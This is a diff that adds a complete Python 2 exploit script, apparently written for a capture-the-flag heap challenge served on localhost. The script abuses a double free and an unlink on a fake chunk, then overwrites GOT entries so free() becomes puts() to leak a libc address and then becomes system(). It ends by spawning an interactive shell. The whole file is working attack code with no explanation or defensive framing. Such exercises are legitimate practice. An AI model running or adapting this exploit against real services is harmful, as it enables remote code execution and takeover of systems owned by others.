@@ -1,0 +1,140 @@
+#!/usr/bin/env python
+#  -*- coding: utf-8 -*-
+import telnetlib
+import struct
+from socket import *
+
+
+def p64(x): return struct.pack("<Q", x)
+
+
+def up64(x): return struct.unpack("<Q", x)[0]
+
+
+def init(ip, port):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect((ip, port))
+    return s
+
+
+def interactive(s):
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+
+
+def recvuntil(s, ch):
+    data = ""
+    while ch not in data:
+        data += s.recv(1)
+    return data
+
+
+def recvline(s):
+    return recvuntil(s, '\n')
+
+
+def keep(s, n, secret):
+    recvuntil(s, "3. Renew secret\n")
+    s.send("1\n")
+
+    recvuntil(s, "2. Big secret\n")
+    try:
+        s.settimeout(0.1)
+        recvline(s)  # for huge secret
+        s.settimeout(None)
+    except:
+        print "huge secret already allocated!"
+    s.send(str(n) + "\n")
+
+    recvuntil(s, "Tell me your secret: \n")
+    s.send(secret)
+    print "[keep] " + str(n)
+
+
+def wipe(s, n, leak=False):
+    recvuntil(s, "3. Renew secret\n")
+    s.send("2\n")
+
+    recvuntil(s, "2. Big secret\n")
+    s.send(str(n) + "\n")
+    if leak == False:
+        print "[wipe] " + str(n)
+    else:
+        leaked_addr = recvline(s)[0:-1]
+        leaked_addr = up64(leaked_addr + "\x00" * (8 -len(leaked_addr)))
+        print "[leak] " + hex(leaked_addr)
+        return leaked_addr
+
+
+def renew(s, n, secret):
+    recvuntil(s, "3. Renew secret\n")
+    s.send("3\n")
+
+    recvuntil(s, "2. Big secret\n")
+    s.send(str(n) + "\n")
+
+    print recvuntil(s, "Tell me your secret: \n")
+    s.send(secret)
+    print "[renew] " + str(n)
+
+
+s = init("localhost", 10003)
+
+print s.recv(1024)
+
+# small chunk size : 0x30, user size : 0x28
+# large chunk size : 0xFB0, user size : 0xfa0
+# huge chunk size  : 0x61A90, user size : ??
+
+keep(s, 1, "a")
+keep(s, 2, "b")
+wipe(s, 1)          # Now chunk1 is in the fast bin
+keep(s, 3, "c")     # Now chunk1 is in the small bin
+wipe(s, 1)          # Now chunk1 is in both the fast bin and small bin
+
+# got
+atoi_got = 0x602080
+puts_got = 0x602020
+puts_plt = 0x400760
+free_got = 0x602018
+
+bss_small = 0x6020d0
+bss_large = 0x6020c0
+bss_huge = 0x6020c8
+
+# make fake chunk & overwrite the large chunk's prev size
+fake_size = 0x20 | 0x0
+fake_fd = bss_small - 0x18
+fake_bk = bss_small - 0x10
+prev_size = 0x20
+
+content = p64(0) + p64(fake_size) + p64(fake_fd) + p64(fake_bk) + p64(prev_size)
+keep(s, 1, content)
+wipe(s, 2)  # unlink fake chunk : *bss_small <- bss_small - 0x18
+
+#         dummy  | bss_large   | bss_huge | bss_small    | big_flag | huge_flag | small_flag
+content = p64(0) + p64(puts_got) + p64(0) + p64(free_got) + p64(1) * 1
+renew(s, 1, content)
+
+#		  free_got
+content = p64(puts_plt)  
+renew(s, 1, content)  # Now free() is replaced by puts()
+
+p_puts = wipe(s, 2, leak=True)  # puts(bss_large) -> prints value of puts_got
+
+# offsets 
+o_system = 0x45390
+o_puts = 0x6f690
+
+libcbase = p_puts - o_puts
+p_system = libcbase + o_system
+
+content = p64(p_system)
+renew(s, 1, content) # Now free() is replaced by system()
+
+raw_input(":")
+keep(s, 2, "sh\0")
+wipe(s, 2)
+
+interactive(s)
